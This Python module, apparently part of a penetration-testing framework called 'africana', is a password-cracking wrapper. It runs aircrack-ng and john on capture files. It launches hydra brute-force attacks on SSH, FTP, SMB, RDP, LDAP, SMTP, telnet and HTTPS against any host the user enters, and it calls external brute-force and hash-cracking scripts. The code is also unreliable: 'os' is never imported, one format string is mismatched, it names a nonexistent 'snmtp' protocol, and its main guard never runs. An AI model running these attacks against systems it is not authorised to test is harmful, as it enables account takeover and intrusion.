import sys
import time
import subprocess
from src.core.banner import *
from src.core.bcolors import *

class pass_killer(object):
    def __init__(self):
        pass

    rc = '/usr/share/wordlists/rockyou.txt.gz'
    if os.path.exists(rc):
        os.system('gunzip /usr/share/wordlists/rockyou.txt.gz')
    else:
        pass

#Offline crackers
    def aircrack_ng(self):
        print(bcolors.BLUE + "\n~>[ " + bcolors.UNDERL + bcolors.CYAN + "Give full path for your .pcap and wordlist to be used" + bcolors.ENDC + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        pcap = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" +  bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.RED + "(Path = %s)".format(pcap) + bcolors.ENDC)
        wordlist = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" +  bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.RED + "(wordlist = %s)" %(wordlist) + bcolors.ENDC)
        time.sleep(3)
        os.system('clear')
        process = subprocess.Popen("aircrack-ng %s -w %s" %(pcap, wordlist), shell = True).wait()
        return process

    def john_cracker(self):
        print(bcolors.BLUE + "\n~>[ " + bcolors.UNDERL + bcolors.CYAN + " Give full path for your .pcap and wordlist to be used" + bcolors.ENDC + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        pcap = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" +  bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.RED + "(Path = %s)" %(pcap) + bcolors.ENDC)
        wordlist = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" +  bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.RED + "(wordlist = %s)" %(wordlist) + bcolors.ENDC)
        time.sleep(3)
        os.system('clear')
        process = subprocess.Popen("john %s --wordlist=%s" %(pcap, wordlist), shell = True).wait()
        return process

#Online crackers
    def hydra_ssh(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing SSH password" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_outfile.txt -u ssh://%s '%(host), encoding='utf8', shell = True).wait()
        return process

    def hydra_ftp(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing FTP password" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_outfile.txt -u ftp://%s '%(host), encoding='utf8', shell = True).wait()
        return process

    def hydra_smb(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing SMB password" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_outfile.txt -u smb://%s '%(host), encoding='utf8', shell = True).wait()
        return process

    def hydra_rdp(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing RDP password" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_outfile.txt -u rdp://%s '%(host), encoding='utf8', shell = True).wait()
        return process

    def hydra_ldap(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing LDAP password" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_outfile.txt -u ldap://%s '%(host), encoding='utf8', shell = True).wait()
        return process

    def hydra_smtp(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing SMTP password" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_outfile.txt -u smtp://%s '%(host), encoding='utf8', shell = True).wait()
        return process

    def hydra_snmtp(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing SNMTP password" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_outfile.txt -u snmtp://%s '%(host), encoding='utf8', shell = True).wait()
        return process

    def hydra_telnet(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing TELNET password" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_outfile.txt -u telnet://%s '%(host), encoding='utf8', shell = True).wait()
        return process

    def hydra_https(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing HTTP/S password" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o hydra_outfile.txt -u https://%s '%(host), encoding='utf8', shell = True).wait()
        return process

#Auto cracking
    def cyberbrute_all(host):
        host = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "target" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing all services" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(host) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('cd ../src/externals/cyberbrute; bash ./cyberbrute.sh %s' %(host), shell = True).wait()
        print("\n")
        return process

#Hashes cracking
    def hash_buster(self):
        hashes = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "hashes" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Bruteforcing Hashes" + bcolors.BLUE + " ]" + bcolors.BLUE + " -> " + bcolors.BLUE + "[ " + bcolors.YELLOW + "%s" %(hashes) + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
        process = subprocess.Popen('cd ../src/externals/hash-buster; python3 ./cracker.py -t 10 %s' %(hashes), shell = True).wait()
        print("\n")
        return process

pass_cracker = pass_killer()
if ' __name__' == '__main__':
        sys.exit(pass_cracker())
